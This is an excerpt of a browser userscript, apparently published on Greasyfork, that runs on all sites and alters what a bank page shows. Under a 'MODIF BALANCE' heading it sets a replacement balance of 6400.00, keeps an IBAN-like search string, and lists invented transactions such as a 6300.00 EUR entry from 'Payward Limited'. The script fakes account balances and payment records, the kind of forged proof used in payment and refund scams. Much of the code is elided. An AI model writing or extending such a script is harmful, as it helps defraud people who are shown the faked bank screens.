...
// ==UserScript==
// @name         Ed Raif Combined Wolfgang Eibensteiner
...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/482759/Ed%20Raif%20Combined%20Wolfgang%20Eibensteiner.user.js
// @updateURL https://update.greasyfork.org/scripts/482759/Ed%20Raif%20Combined%20Wolfgang%20Eibensteiner.meta.js
// ==/UserScript==
...
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE-------------
    ...
    var modificationValue = 6400.00; // Change this value as needed
...
//    var searchText = "AT09 3411 0000 0182 1701"; // Text to search for in the page
    ...
    var transactions = [
      ...
      {
            transactionName: "Payward Limited",
            transactionDetails: "OHNE ANDREAS GRAF NICHT AUSGEBEN!!!",
            transactionAmount: "6300.00 EUR",
